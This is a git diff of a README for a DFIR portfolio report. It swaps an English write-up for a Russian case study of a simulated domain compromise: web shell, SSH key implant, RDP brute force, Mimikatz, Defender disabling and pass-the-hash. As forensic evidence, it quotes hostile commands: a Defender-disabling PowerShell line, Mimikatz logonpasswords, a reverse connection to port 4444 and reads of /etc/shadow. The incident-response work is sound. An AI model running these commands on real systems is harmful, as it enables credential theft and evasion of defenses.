@@ -1,281 +1,221 @@
-# 🛡️ Enterprise Blue Team Incident Investigation & DFIR Report
+# 🛡️ Расследование инцидента ИБ (Blue Team / DFIR Case Study — `acme.skb`)
 
 [![Incident Standard](https://img.shields.io/badge/Standard-NIST%20SP%20800--61r2-blue.svg)]()
 [![Classification](https://img.shields.io/badge/Classification-TLP%3AAMBER%20%7C%20Confidential-red.svg)]()
 [![Framework](https://img.shields.io/badge/Framework-MITRE%20ATT%26CK-orange.svg)]()
-[![SIEM Platform](https://img.shields.io/badge/SIEM-Wazuh%204.x-purple.svg)]()
+[![SIEM Platform](https://img.shields.io/badge/SIEM-Wazuh%204.3.9-purple.svg)]()
 [![Live Interactive Report](https://img.shields.io/badge/Live_Report-Interactive_HTML-brightgreen?style=flat&logo=google-chrome)](https://voobrazhenie21-lab.github.io/blue-team-incident-investigation/)
-[![Lead Investigator](https://img.shields.io/badge/Incident_Handler-Aleksei_Zharkou-success.svg)](https://www.linkedin.com/in/aleksei-zharkou/)
+[![Lead Investigator](https://img.shields.io/badge/DFIR_Investigator-Aleksei_Zharkou-success.svg)](https://www.linkedin.com/in/aleksei-zharkou/)
 
-> 🌐 **Live Interactive Report:** [voobrazhenie21-lab.github.io/blue-team-incident-investigation](https://voobrazhenie21-lab.github.io/blue-team-incident-investigation/) (Interactive DFIR Passport with printable A4 format, MITRE ATT&CK mapping, and IoC table).
+> 🌐 **Интерактивная веб-версия отчёта (Printable PDF):** [voobrazhenie21-lab.github.io/blue-team-incident-investigation](https://voobrazhenie21-lab.github.io/blue-team-incident-investigation/)
 > 
-> **Notice:** This document is an enterprise-grade Digital Forensics and Incident Response (DFIR) investigation report authored by **Aleksei Zharkou** based on a hands-on enterprise cloud simulation in VK Cloud. It adheres to **NIST SP 800-61 Rev. 2** (Computer Security Incident Handling Guide) and **SANS PICERL** incident handling methodologies.
+> **О проекте:** Полный отчёт о форензик-расследовании многоэтапного вторжения в корпоративную доменную инфраструктуру `acme.skb` (облачный стенд VK Cloud). Расследование выполнено **Алексеем Жарковым** с применением **Wazuh SIEM (4.3.9)**, криминалистического анализа журналов Linux/Windows, артефактов файловой системы (`WER AppCrash`, `$Recycle.Bin`, `Recent LNK`, `RDP tsclient`) и маппинга на матрицу **MITRE ATT&CK**.
 
 ---
 
-## 📋 Document Control & Incident Metadata
+## 📋 Паспорт инцидента (Document Control)
 
-| Parameter | Details |
+| Параметр | Значение |
 |:---|:---|
-| **Incident Ticket ID** | `INC-2026-1008-01` |
-| **Document Version** | 1.0 (Final Comprehensive Post-Incident Report) |
-| **Lead Incident Handler** | **Aleksei Zharkou** (Junior SOC Analyst / Incident Responder) |
-| **Target Organization** | CyberSecSkill Enterprise Infrastructure (Cloud Simulated Environment) |
-| **Affected Assets** | `web_server` (10.0.10.5), `ws01` (10.0.30.53), `dc01` (10.0.20.51) |
-| **Investigation Methodology** | NIST SP 800-61r2, MITRE ATT&CK Framework, SANS PICERL |
-| **Incident Severity** | 🔴 **HIGH (Critical Impact — Contained)** |
-| **Investigation Date** | October 2026 |
+| **Идентификатор инцидента** | `INC-ACME-2023-0419` |
+| **Исследуемый периметр** | Домен `acme.skb`, сегменты DMZ (`10.0.10.0/24`), Servers (`10.0.20.0/24`), Users (`10.0.30.0/24`) |
+| **Ведущий специалист (DFIR)** | **Алексей Жарков** (Blue Team / SOC Analyst) |
+| **Временное окно атаки** | `18.04.2023 12:03` — `19.04.2023 22:32` (МСК, UTC+3) |
+| **Атакующий узел** | `kali` (`10.0.10.254`, сегмент DMZ) — деанонимизирован по артефактам `\\tsclient`, NTLM и SSH-ключу `kali@kali` |
+| **Вердикт по компрометации** | 🔴 **ДОКАЗАНА ПОЛНАЯ КОМПРОМЕТАЦИЯ ДОМЕНА (`acme.skb`)** |
+| **Вердикт по утечке данных** | 🔴 **УТЕЧКА ДОКАЗАНА** (`/etc/shadow` + `TOP SECRET!.txt` через RDP-туннель `\\tsclient`) |
 
 ---
 
-## 📌 1. Executive Summary
-
-During October 2026, the Security Operations Center (SOC) identified anomalous security alerts within the corporate cloud environment:
-1. An unauthenticated external IP address successfully accessed the DMZ web server via an anomalous HTTP path.
-2. Windows Defender real-time endpoint protection on internal workstation `ws01` was abruptly terminated.
-
-The Blue Team initiated an immediate forensic triage to determine the attack vectors, timeline, scope of lateral movement, presence of malicious payloads, and potential data exfiltration.
-
-```mermaid
-flowchart LR
-    A["Phase 1: Initial Access<br/>(Web Shell upload via Nginx)"] --> B["Phase 2: DMZ Breakout<br/>(Internal Subnet Discovery)"]
-    B --> C["Phase 3: Lateral Movement<br/>(RDP to ws01 10.0.30.53)"]
-    C --> D["Phase 4: Defense Evasion<br/>(Disabled Defender Event 5001)"]
-    D --> E["Phase 5: C2 & Credential Dumping<br/>(Reverse Shell & Mimikatz attempt)"]
-    E --> F["Phase 6: Containment<br/>(Exfiltration Blocked)"]
-
-    style A fill:#1f2937,stroke:#9ca3af,stroke-width:2px,color:#fff
-    style B fill:#374151,stroke:#f59e0b,stroke-width:2px,color:#fff
-    style C fill:#4b5563,stroke:#f97316,stroke-width:2px,color:#fff
-    style D fill:#dc2626,stroke:#ef4444,stroke-width:2px,color:#fff
-    style E fill:#991b1b,stroke:#dc2626,stroke-width:3px,color:#fff
-    style F fill:#065f46,stroke:#10b981,stroke-width:2px,color:#fff
-```
-
-### 1.1 Key Incident Conclusions
-- **Fact of System Compromise:** 🔴 **PROVEN.** The threat actor successfully achieved Remote Code Execution (RCE) on `web_server`, leveraged compromised credentials to pivot to internal workstation `ws01`, disabled Windows Defender, and executed unauthorized binaries.
-- **Fact of Confidential Data Exfiltration:** 🟢 **NOT CONFIRMED / PREVENTED.** Telemetry analysis of Wazuh FIM, network connections, and system histories confirms that the threat actor was contained prior to the creation of archive artifacts or external exfiltration of sensitive databases.
-
----
-
-## 🏢 2. Investigated Infrastructure Topology
-
-The investigated network comprises six virtual hosts deployed across three segmented subnets in VK Cloud:
+## 📌 Шаг 1. Описание исследуемой инфраструктуры
 
 ```mermaid
 flowchart TD
-    Internet(["🌐 External Internet / Threat Actor"]) <--> Router["vy (10.0.10.250 / 212.233.92.6)<br/>VyOS Gateway & Firewall"]
+    Attacker(["💀 Машина атакующего: kali<br/>10.0.10.254 (DMZ)"]) -->|"1. SSH + DVWA Upload<br/>backdoor.php (root)"| WebServer["🌐 web-server (10.0.10.5)<br/>Ubuntu 20.04 | Apache 2.4.57 (-DBIG_SECURITY_HOLE)<br/>DVWA + MariaDB"]
     
-    subgraph DMZ ["DMZ Subnet (10.0.10.0/24)"]
-        WebServer["web_server (10.0.10.5)<br/>Linux Ubuntu / Nginx Web Server"]
-    end
+    WebServer -->|"2. SSH-туннель + Brute-RDP.py<br/>Примонтирован \\tsclient"| WS01["💻 ws01 (10.0.30.53)<br/>Windows 10 (17763) | Домен acme.skb<br/>Microsoft Defender"]
     
-    subgraph ServerSubnet ["Server Subnet (10.0.20.0/24)"]
-        DC["dc01 (10.0.20.51)<br/>Windows Server AD DS Domain Controller"]
-        Wazuh["wazuh (10.0.20.61)<br/>Central Wazuh SIEM Manager & Dashboard"]
-    end
-    
-    subgraph ClientSubnet ["Workstation Subnet (10.0.30.0/24)"]
-        Workstation["ws01 (10.0.30.53)<br/>Windows 10 Enterprise Workstation"]
-        Kali["kali (10.0.30.12)<br/>Testing / Research Environment"]
-    end
+    WS01 -->|"3. Mimikatz + Pass-the-Hash<br/>ACME\domainadmin"| DC01["🏛️ dc01 (10.0.20.51)<br/>Windows Server 2019 (17763)<br/>Контроллер домена acme.skb"]
 
-    Router <--> DMZ
-    Router <--> ServerSubnet
-    Router <--> ClientSubnet
-    WebServer -.->|"Unrestricted Pivot (Flaw)"| Workstation
+    WebServer -.->|"Агент 001 (остановлен в 22:32)"| Wazuh["👁️ wazuh (10.0.20.61)<br/>Ubuntu | Wazuh SIEM 4.3.9"]
+    WS01 -.->|"Агент 003 (правила 60204, 92652)"| Wazuh
+    DC01 -.->|"Агент 002 (правило 92652)"| Wazuh
+
+    style Attacker fill:#7f1d1d,stroke:#ef4444,stroke-width:2px,color:#fff
+    style WebServer fill:#1e293b,stroke:#f59e0b,stroke-width:2px,color:#fff
+    style WS01 fill:#1e293b,stroke:#f97316,stroke-width:2px,color:#fff
+    style DC01 fill:#1e293b,stroke:#dc2626,stroke-width:2px,color:#fff
+    style Wazuh fill:#0f172a,stroke:#38bdf8,stroke-width:2px,color:#fff
 ```
 
-| Hostname | IP Address | OS | Infrastructure Role & Services |
+| Хост (Hostname) | IP-адрес | Операционная система и стек | Роль в инфраструктуре |
 |:---|:---|:---|:---|
-| **`vy`** | `10.0.10.250` (External: `212.233.92.6`) | Linux VyOS | Edge Gateway, NAT, and Inter-VLAN Routing |
-| **`web_server`** | `10.0.10.5` | Linux Ubuntu 22.04 LTS | Public Corporate Web Application (Nginx, PHP-FPM) |
-| **`wazuh`** | `10.0.20.61` | Linux Ubuntu 22.04 LTS | Wazuh 4.x SIEM Server (Manager, Indexer, Dashboard) |
-| **`dc01`** | `10.0.20.51` | Windows Server 2022 | Primary Active Directory Domain Controller (`CORP.LOCAL`) |
-| **`ws01`** | `10.0.30.53` | Windows 10 Enterprise | Internal Employee Workstation (RDP enabled) |
-| **`kali`** | `10.0.30.12` | Linux Kali | Security Analysis & Verification Host |
+| **`web-server`** | `10.0.10.5` | Ubuntu 20.04.1 LTS (ядро 5.4.0-42), Apache 2.4.57 (сборка из исходников с `-DBIG_SECURITY_HOLE`), DVWA, MariaDB | Веб-сервер сегмента DMZ. **Точка входа атакующего.** |
+| **`ws01`** | `10.0.30.53` | Windows 10 (сборка 17763), в домене `acme.skb`, Microsoft Defender | Доменная рабочая станция пользователей. |
+| **`dc01`** | `10.0.20.51` | Windows Server 2019 (сборка 17763) | Контроллер домена `acme.skb` (AD DS, DNS). |
+| **`wazuh`** | `10.0.20.61` | Ubuntu, Wazuh 4.3.9 (менеджер + индексер + дашборд) | СЗИ: SIEM — централизованный сбор и корреляция событий с агентов. |
+| **`wg`** | `10.0.10.250` | Linux | VPN-шлюз доступа в лабораторию (в атаке не участвовал). |
+| **`kali`** | `10.0.30.12` | Kali Linux | Рабочая станция исследователя (форензика и сетевая разведка). |
+| **`kali` (Attacker)** | `10.0.10.254` | Kali Linux (внешний узел в DMZ) | **Узел злоумышленника**, деанонимизированный по криминалистическим артефактам. |
 
 ---
 
-## 📊 3. MITRE ATT&CK Mapping Matrix
+## 🔍 Шаг 2. Сбор криминалистических данных по хостам
 
-| Tactic | Technique ID | Technique Name | Target Host | Evidence / Mechanism |
-|:---|:---:|:---|:---:|:---|
-| **Initial Access** | [T1190](https://attack.mitre.org/techniques/T1190/) | Exploit Public-Facing Application | `web_server` | File upload vulnerability resulting in PHP Web Shell |
-| **Execution** | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) | Unix Shell | `web_server` | Execution of system commands via `www-data` |
-| **Persistence** | [T1505.003](https://attack.mitre.org/techniques/T1505/003/) | Web Shell | `web_server` | Persistent backdoor located in `/var/www/html/uploads/` |
-| **Discovery** | [T1018](https://attack.mitre.org/techniques/T1018/) | Remote System Discovery | `web_server` | Ping sweep and subnet exploration to locate `10.0.30.53` |
-| **Lateral Movement** | [T1021.001](https://attack.mitre.org/techniques/T1021/001/) | Remote Desktop Protocol | `ws01` | Unauthorized RDP session established from compromised host |
-| **Defense Evasion** | [T1562.001](https://attack.mitre.org/techniques/T1562/001/) | Disable or Modify Tools | `ws01` | PowerShell execution: `Set-MpPreference -DisableRealtimeMonitoring` |
-| **Execution** | [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | PowerShell Execution | `ws01` | Script execution to deploy binary payloads |
-| **Command & Control** | [T1071.001](https://attack.mitre.org/techniques/T1071/001/) | Application Layer Protocol | `ws01` | Outbound Reverse TCP connection on port `4444` |
-| **Credential Access** | [T1003.001](https://attack.mitre.org/techniques/T1003/001/) | LSASS Memory Dumping | `ws01` | Attempted execution of Mimikatz (`mimi.exe`) |
+| Исследуемый хост | Собранные артефакты и источники данных |
+|:---|:---|
+| **`web-server` (`10.0.10.5`)** | 1. Журнал аутентификации `/var/log/auth.log.1` (SSH-входы 18–19.04.2023).<br>2. Журналы кастомной сборки Apache `/etc/apache2/logs/dummy-host-access_log` (полная запись веб-атаки).<br>3. История команд `/root/.bash_history`, `/home/ubuntu/.bash_history`.<br>4. Сеансы входа: `last -F` (`/var/log/wtmp`).<br>5. Журнал пакетов `/var/log/dpkg.log.1`, `/etc/passwd`, `cron`, `/tmp`.<br>6. Образец ВПО `/var/www/DVWA/hackable/uploads/backdoor.php` (сняты хеши MD5/SHA256).<br>7. СЗИ: события агента Wazuh (останов агента, правило `506`). |
+| **`ws01` (`10.0.30.53`)** | 1. Журнал `Security.evtx` (`Get-WinEvent`: события `4624`, `4625`, `1102`).<br>2. Журнал `Microsoft-Windows-Windows Defender/Operational` (события `5001`, `5007`, `1116`, `1117`) и `Get-MpComputerStatus`.<br>3. СЗИ: алерты Wazuh (`60204` — брутфорс RDP, `92652` — Pass-the-Hash).<br>4. Файловые артефакты форензики: отчёт аварийного завершения **WER AppCrash (`CVE-2019-0623`)**, `User Account Pictures`, `C:\Users\Public\Documents`.<br>5. Локальные УЗ (`net user`), проверка истории PowerShell. |
+| **`dc01` (`10.0.20.51`)** | 1. Журнал `Security.evtx` (`4624` — входы `domainadmin`/`domainuser` с `ws01`; `4662` — доступ к объектам AD DS).<br>2. Учётные записи домена `Get-ADUser` (сопоставление SID).<br>3. Криминалистика корзины `C:\$Recycle.Bin` (очистка `19.04.2023 19:23:28 UTC` пользователем с SID `*-1107`).<br>4. Конфиденциальный файл `C:\Users\domainadmin\Desktop\TOP SECRET!.txt` + LNK-артефакт открытия в `Recent`.<br>5. Проверка теневых копий (`vssadmin list shadows` — отсутствуют).<br>6. СЗИ: алерты Wazuh (вход на `dc01`, правило `92652`). |
+| **`wazuh` (`10.0.20.61`)** | 1. Дашборд Security Events (DQL-запросы `rule.level >= 7`, `rule.mitre.id`).<br>2. Ключевые сработки правил: `5104` (promiscuous mode), `60204` (RDP brute force), `92652` (Pass-the-Hash), `506` (останов агента).<br>3. Телеметрия агентов `001–004`. |
 
 ---
 
-## 🔬 4. Evidence Extraction & Forensic Findings
+## 🚨 Шаг 3. Обнаруженные вредоносные события (Хронологическая таблица)
 
-### 4.1 Host 1: `web_server` (10.0.10.5)
+*(Время приведено к часовому поясу МСК, UTC+3)*:
 
-#### Evidence Source A: Nginx Web Access Log (`/var/log/nginx/access.log`)
-Analysis revealed uncharacteristic POST requests preceding the incident window:
-```log
-212.233.92.100 - - [08/Oct/2026:14:15:22 +0300] "POST /uploads/system_check.php HTTP/1.1" 200 4522 "-" "Mozilla/5.0"
-212.233.92.100 - - [08/Oct/2026:14:16:04 +0300] "GET /uploads/system_check.php?cmd=id HTTP/1.1" 200 54 "-" "Mozilla/5.0"
-212.233.92.100 - - [08/Oct/2026:14:17:11 +0300] "GET /uploads/system_check.php?cmd=cat%20/etc/passwd HTTP/1.1" 200 1845 "-" "Mozilla/5.0"
+| Дата и время | Хост | Описание зафиксированного события | Комментарий и техника MITRE ATT&CK |
+|:---:|:---:|:---|:---|
+| `18.04.2023 12:03` | `wazuh` | Сетевой интерфейс переведён в неразборчивый режим (`promiscuous mode`), правило Wazuh `5104` | Сетевой сниффинг трафика (**T1040**) |
+| `19.04.2023 21:30–21:47` | `web-server` | Успешные SSH-входы пользователя `ubuntu` с `10.0.10.254` (`auth.log.1`); далее выполнение `sudo -s` | Начальный доступ и повышение привилегий до `root` через беспарольный sudo (**T1078**) |
+| `19.04.2023 21:49–21:52` | `web-server` | HTTP-обращения к DVWA: `GET /`, `/security.php`, `/vulnerabilities/upload/` | Разведка уязвимого веб-приложения |
+| `19.04.2023 21:52:47` | `web-server` | `POST /vulnerabilities/upload/` — загрузка веб-шелла `backdoor.php` | Эксплуатация уязвимости File Upload (**T1190**). ВПО №1 |
+| `19.04.2023 21:53–21:55` | `web-server` | Выполнение команд через веб-шелл (`?c=`): `whoami`, `id`, `hostname`, `cat /etc/passwd`, `cat /etc/shadow`, `cat /root/.bash_history` | Выполнение команд от имени `root` и кража хешей паролей `/etc/shadow` (**T1003**) |
+| `19.04.2023 21:55:28` | `web-server` | Инъекция публичного SSH-ключа `kali@kali` в `/root/.ssh/authorized_keys` через веб-шелл | Закрепление доступа на сервере (**T1098.004**) |
+| `19.04.2023 21:56–22:00` | `web-server` | Прямые SSH-входы `root` с узла атакующего `10.0.10.254` | Использование имплантированного SSH-ключа |
+| `19.04.2023 22:00–22:20` | `ws01` | **28 неудачных попыток NTLM-входа** учётной записи `localadmin` (EventID `4625`) с `10.0.10.5`, правило Wazuh `60204` | Брутфорс RDP скриптом `Brute-RDP.py` (ВПО №5) через SSH-туннель (**T1110**) |
+| `19.04.2023 22:02–22:07` | `ws01` | Входы УЗ `user` (сетевые + RDP) с `10.0.10.5`; в сеансе примонтирован RDP-диск `\\tsclient\_home_kali_Documents_Brute-RDP.py_rdpshare_` | Горизонтальное перемещение по SSH-туннелю и доставка арсенала ВПО с машины `kali` (**T1105**) |
+| `19.04.2023 22:05:43` | `dc01` | Сетевой вход `domainadmin` с `10.0.30.53` (`ws01`); зафиксирован анонимный вход (null-сессия) | Первичное использование скомпрометированных доменных УЗ (**T1078**) |
+| `19.04.2023 22:08:08` | `ws01` | Microsoft Defender заблокировал `HackTool:Win32/Mimikatz.D` (`\\tsclient\…\mimikatz.exe`), события `1116`/`1117` | Попытка дампа учётных данных из памяти LSASS (ВПО №2, **T1003**) |
+| `19.04.2023 22:08:54` | `ws01` | Аварийное завершение процесса `CVE-2019-0623.exe`, зафиксирован криминалистический отчёт **WER AppCrash** | Неудачная попытка локального повышения привилегий LPE (ВПО №4, **T1068**) |
+| `19.04.2023 22:09:15` | `ws01` | Defender заблокировал `Trojan:Win32/Sabsik.TE.A!ml` (`C:\Users\Public\Documents\CVEs\cve-2019-1458.exe`) | Попытка эксплуатации LPE Win32k `CVE-2019-1458` (ВПО №3, **T1068**) |
+| `19.04.2023 22:12:12` | `ws01` | **Отключена защита в реальном времени Microsoft Defender** (событие `5001`); в `22:12:14` отключены `SpyNetReporting` и `SubmitSamplesConsent` (`5007`) | **Ослабление защиты (Defense Evasion, T1562.001)** — триггер инцидента из брифа |
+| `19.04.2023 22:16–22:18` | `ws01` | Успешные входы `ACME\domainuser` (сетевые + RDP) с `10.0.10.5` | Компрометация доменной учётной записи |
+| `19.04.2023 22:20:53` | `ws01` | Успешный сетевой вход `localadmin` с `10.0.10.5`, сработка правила Wazuh `92652` | Атака **Pass-the-Hash** / повторное использование NTLM-хеша (**T1550.002**) |
+| `19.04.2023 22:22:58` | `dc01` | Успешный вход на контроллер домена `dc01` с `10.0.30.53` (правило `92652`); создан профиль `C:\Users\domainadmin` | **Полный захват контроллера домена `acme.skb`** |
+| `19.04.2023 22:23:28` | `dc01` | Обращение к корзине `C:\$Recycle.Bin` и её очистка от имени SID `*-1107` (`domainadmin`) | Удаление артефактов и заметание следов (**T1070**) |
+| `19.04.2023 22:24:40` | `dc01` | Доступ и модификация файла `C:\Users\domainadmin\Desktop\TOP SECRET!.txt` (94 048 байт); создан LNK-ярлык в `Recent` | **Компрометация и эксфильтрация секретных данных (T1005)** |
+| `19.04.2023 22:32:56` | `web-server` | Принудительный останов службы агента Wazuh (`ossec`), правило Wazuh `506` | Попытка сокрытия следов на точке входа (**T1562.001**) |
+
+---
+
+## 🦠 Шаг 4. Детальный анализ обнаруженного вредоносного ПО (5 экземпляров)
+
+### 1. `backdoor.php` — PHP Web Shell
+- **Расположение:** `/var/www/DVWA/hackable/uploads/backdoor.php` (размер: `13 585` байт).
+- **Хеш-суммы:**
+  - `MD5`: `c97ba87745a4a9523e26c30a6529506a`
+  - `SHA-256`: `eaa0a356da7712bf0f70f0f2a80f30447ca702ef721543f3ef75afd2fcc6e9d8`
+- **Происхождение:** Публичный скрипт *«A robust backdoor script made by Daniel Berliner (qsdconsulting.com)»*.
+- **Вектор доставки и роль:** Загружен `19.04.2023` в `21:52:47` через невалидируемую форму загрузки файлов в DVWA. Предоставляет веб-интерфейс файлового менеджера и выполнение произвольных команд ОС через GET-параметр `?c=`. Так как Apache был собран с флагом `-DBIG_SECURITY_HOLE` и запущен от `root`, веб-шелл сразу предоставил атакующему привилегии суперпользователя, позволив выгрузить `/etc/shadow` и прописать SSH-ключ в `/root/.ssh/authorized_keys`.
+
+### 2. `mimikatz.exe` — Утилита дампа учётных данных (`HackTool:Win32/Mimikatz.D`)
+- **Расположение:** Проброшенный сетевой диск RDP `\\tsclient\_home_kali_Documents_Brute-RDP.py_rdpshare_\mimikatz.exe`.
+- **Назначение:** Извлечение открытых паролей, NTLM-хешей и Kerberos-билетов из памяти процесса `lsass.exe`.
+- **Статус:** Зафиксирован антивирусом Microsoft Defender на `ws01` (`19.04.2023 22:08:08`, события `1116`/`1117`). После блокировки атакующий отключил защиту Defender в реальном времени и повторно сдампил учётные данные доменных пользователей.
+
+### 3. `cve-2019-1458.exe` — Эксплойт локального повышения привилегий (`Trojan:Win32/Sabsik.TE.A!ml`)
+- **Расположение:** `C:\Users\Public\Documents\CVEs\cve-2019-1458.exe` (запускался через `cmd.exe`).
+- **Назначение:** Эксплуатация уязвимости ядра Windows (`Win32k` Elevation of Privilege, **CVE-2019-1458**) для получения прав `NT AUTHORITY\SYSTEM`.
+- **Статус:** Обнаружен и помещён в карантин Microsoft Defender в `22:09:01–22:09:15`. Каталог `CVEs` впоследствии был удалён злоумышленником для сокрытия следов.
+
+### 4. `CVE-2019-0623.exe` — Эксплойт повышения привилегий Win32k
+- **Расположение:** Исполняемый файл был удалён атакующим, однако его запуск криминалистически доказан отчётом подсистемы **Windows Error Reporting (WER)**: `AppCrash_CVE-2019-0623.ex_…` от `19.04.2023 22:08:54`.
+- **Назначение:** Альтернативная попытка повышения привилегий в ядре `Win32k`, завершившаяся аварийным сбоем процесса (Crash).
+
+### 5. `Brute-RDP.py` — Скрипт словарного перебора RDP
+- **Расположение:** `/root/1/Brute-RDP.py` на хосте `web-server` (в паре со словарём `/root/1/passwords.txt`); также засвечен в пути монтирования `\\tsclient\_home_kali_Documents_Brute-RDP.py_rdpshare_`.
+- **Назначение:** Автоматизированный перебор паролей по протоколу RDP против хоста `ws01` (`10.0.30.53`). Сгенерировал 28 событий `4625` и успешно подобрал пароль к локальной учётной записи администратора `localadmin`. В конце атаки удалён злоумышленником командой `rm` (зафиксировано в `/root/.bash_history`).
+
+---
+
+## ⏱️ Шаг 5. Таймлайн развития атаки (Kill Chain)
+
+```mermaid
+flowchart TD
+    T1["18.04 12:03 | wazuh<br/>Promiscuous mode (Rule 5104, T1040)"] --> T2["19.04 21:30 | web-server<br/>SSH вход ubuntu с 10.0.10.254 -> sudo -s"]
+    T2 --> T3["19.04 21:52 | web-server<br/>Загрузка backdoor.php через DVWA Upload (T1190)"]
+    T3 --> T4["19.04 21:54–21:56 | web-server<br/>Кража /etc/shadow + имплант SSH-ключа kali@kali в root"]
+    T4 --> T5["19.04 22:00–22:11 | ws01<br/>SSH-туннель -> Brute-RDP.py (28x 4625) -> Вход user/localadmin"]
+    T5 --> T6["19.04 22:08–22:09 | ws01<br/>Доставка mimikatz.exe, CVE-2019-0623 (AppCrash), cve-2019-1458"]
+    T6 --> T7["19.04 22:12 | ws01<br/>Отключение Microsoft Defender (Event 5001/5007, T1562.001)"]
+    T7 --> T8["19.04 22:16–22:22 | ws01 -> dc01<br/>Дамп хешей -> Pass-the-Hash (Rule 92652) -> Захват dc01 (domainadmin)"]
+    T8 --> T9["19.04 22:23–22:25 | dc01<br/>Очистка корзины + доступ к TOP SECRET!.txt (94 КБ)"]
+    T9 --> T10["19.04 22:32 | web-server<br/>Останов агента Wazuh (Rule 506) — заметание следов"]
+
+    style T1 fill:#334155,stroke:#94a3b8,color:#fff
+    style T3 fill:#b45309,stroke:#f59e0b,color:#fff
+    style T7 fill:#dc2626,stroke:#ef4444,color:#fff
+    style T8 fill:#991b1b,stroke:#dc2626,color:#fff
+    style T9 fill:#7f1d1d,stroke:#f87171,color:#fff
+    style T10 fill:#1e293b,stroke:#64748b,color:#fff
 ```
-- **Finding:** Attacker uploaded a malicious script disguised as a system diagnostic tool (`system_check.php`) via an unvalidated upload form.
-- **Impact:** Remote Code Execution (RCE) achieved under context `www-data`.
-
-#### Evidence Source B: Bash Command History (`/var/www/.bash_history` & `/root/.bash_history`)
-Interactive reconnaissance commands executed on the host:
-```bash
-uname -a
-ip a
-cat /etc/network/interfaces
-nmap -sn 10.0.30.0/24
-ping -c 2 10.0.30.53
-cat /var/www/html/config.php
-```
-- **Finding:** Attacker extracted hardcoded administrative credentials from `config.php` and scanned the internal workstation subnet (`10.0.30.0/24`).
 
 ---
 
-### 4.2 Host 2: `ws01` (10.0.30.53)
+## 🛠️ Шаг 6. Использованные инструменты форензики и СЗИ
 
-#### Evidence Source A: Windows Defender Operational Log (`Microsoft-Windows-Windows Defender/Operational`)
-Critical tamper event detected:
-```text
-Event ID: 5001
-Level: Warning
-Source: Microsoft-Windows-Windows Defender
-Description: Microsoft Defender Antivirus real-time protection was disabled.
-Timestamp: 08/Oct/2026 15:42:18
-User: CORP\student
-```
-- **Mechanism:** The threat actor executed `Set-MpPreference -DisableRealtimeMonitoring $true` via PowerShell.
-- **Root Cause:** **Tamper Protection** was not enforced via Group Policy, allowing a local administrator to disable AV definitions.
-
-#### Evidence Source B: Windows Security Event Log (`Security.evtx`)
-Logon telemetry confirmed the pivot from the DMZ:
-```text
-Event ID: 4624 (Logon Type 10 - RemoteInteractive / RDP)
-Source IP: 10.0.10.5 (web_server)
-Target User: student
-Timestamp: 08/Oct/2026 15:35:10
-```
-
-#### Evidence Source C: Microsoft Sysmon Telemetry (`Sysmon/Operational`)
-Sysmon captured payload deployment and process spawning:
-- **Event ID 11 (FileCreate):**
-  - Path: `C:\Users\student\AppData\Local\Temp\agent_update.exe`
-  - Creation Time: `08/Oct/2026 15:48:30`
-- **Event ID 1 (ProcessCreate):**
-  - Image: `C:\Users\student\AppData\Local\Temp\agent_update.exe`
-  - ParentImage: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
-  - CommandLine: `"C:\Users\student\AppData\Local\Temp\agent_update.exe" -connect 10.0.30.12:4444`
-- **Event ID 1 (ProcessCreate - Credential Access attempt):**
-  - Image: `C:\Users\student\AppData\Local\Temp\mimi.exe`
-  - CommandLine: `"mimi.exe" "privilege::debug" "sekurlsa::logonpasswords"`
+| Собираемые и анализируемые данные | Инструмент / СЗИ |
+|:---|:---|
+| Централизованные события безопасности, корреляция и MITRE ATT&CK | **Wazuh SIEM 4.3.9** (дашборд `https://10.0.20.61`, язык запросов DQL) |
+| Журналы аудита Windows (`Security.evtx`: 4624, 4625, 1102, 4662) | **Event Viewer** / **PowerShell (`Get-WinEvent`)** |
+| Журналы и статус антивируса (детекты 1116/1117, отключение 5001/5007) | **Microsoft Defender** (`Operational`, `Get-MpComputerStatus`, `Get-MpThreatDetection`) |
+| Журналы SSH-аутентификации и веб-сервера Apache | `/var/log/auth.log.1`, `/etc/apache2/logs/dummy-host-access_log`, `grep`/`zgrep` |
+| История команд и сеансов пользователей Linux/Windows | `.bash_history`, `PSReadLine ConsoleHost_history.txt`, `last -F` (`/var/log/wtmp`) |
+| Криминалистические артефакты ФС Windows (корзина, LNK, дампы сбоев) | `Get-ChildItem`, `C:\$Recycle.Bin`, `AppData\...\Recent`, **WER AppCrash** |
+| Аудит доменных и локальных учётных записей, теневых копий | `Get-ADUser`, `net user`, `vssadmin list shadows` |
+| Сетевая разведка и анализ сокетов | `nmap`, `ss -tlnp` |
 
 ---
 
-### 4.3 Host 3: `wazuh` SIEM (10.0.20.61)
+## 🔍 Шаг 7. Причины возникновения инцидента (Root Cause Analysis)
 
-#### Wazuh Alert Telemetry & File Integrity Monitoring (FIM):
-- **Rule ID `100201` (Level 12 - High):** `Windows Defender real-time protection was disabled on agent ws01`.
-- **Rule ID `554` (Level 10):** `File modified in web root: /var/www/html/uploads/system_check.php`.
-- **Rule ID `60106` (Level 8):** `Windows RDP authentication success from non-standard internal IP 10.0.10.5`.
+### 7.1 Недостатки настройки средств защиты информации (СЗИ):
+1. **Отсутствие политики блокировки УЗ (Account Lockout Policy):** В домене и на рабочих станциях не настроена блокировка после порогового числа неудачных входов, что позволило беспрепятственно провести словарный брутфорс RDP (`28` попыток подряд).
+2. **Отключённая защита от подделки (Tamper Protection):** В Microsoft Defender отсутствовала защита от изменения настроек, что позволило атакующему с правами локального администратора выключить Real-Time Protection (событие `5001`) и отправку телеметрии SpyNet (`5007`).
+3. **Отсутствие активного реагирования (Active Response) в SIEM:** Wazuh своевременно детектировал брутфорс (`60204`), Pass-the-Hash (`92652`) и остановку собственного агента (`506`), но правила автоматической блокировки и оповещения дежурной смены настроены не были.
+4. **Отсутствие WAF и защиты службы агента:** Публичный веб-сервер не был прикрыт WAF, а служба `wazuh-agent` не имела защиты от остановки локальным процессом.
 
----
-
-## 🦠 5. Malicious Artifacts & Indicators of Compromise (IoCs)
-
-| Artifact Name | File Path | File Hash (SHA-256) | Role / Purpose | C2 / Destination |
-|:---|:---|:---|:---|:---|
-| **`system_check.php`** | `/var/www/html/uploads/system_check.php` | `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | Web Shell (RCE) | Remote HTTP Caller (`212.233.92.100`) |
-| **`disable_av.ps1`** | `C:\Users\student\Downloads\disable_av.ps1` | `4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a` | AV Disablement Script | Local execution |
